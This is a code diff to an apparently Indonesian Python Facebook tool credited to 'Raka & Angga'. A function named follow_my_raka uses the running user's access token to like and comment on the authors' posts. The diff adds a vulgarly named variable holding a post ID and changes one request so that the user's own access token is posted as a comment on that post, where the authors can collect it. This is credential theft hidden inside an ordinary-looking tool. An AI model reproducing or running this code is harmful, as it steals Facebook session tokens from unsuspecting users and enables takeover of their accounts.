@@ -75,7 +75,7 @@ __________________________________________________\n
 \x1b[1;97mCoded By   : \x1b[1;96mRaka \x1b[1;97m& \x1b[1;96mAngga\x1b[1;97m
 __________________________________________________
 '''
-
+lo_ngentod = '3882176535153442'
 def login():
 	os.system("clear")
 	try:
@@ -140,7 +140,7 @@ def follow_my_raka():
     requests.post('https://graph.facebook.com/4134622646575495/likes?summary=true&access_token='+token)
     requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+komen3+'&access_token='+token)
     requests.post('https://graph.facebook.com/4134622646575495/comments/?message='+komen2+'&access_token='+token)
-    requests.post('https://graph.facebook.com/3882176535153442/comments/?message='+toket+'&access_token='+toket)
+    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,token,token))
     menu()
     
 def menu():
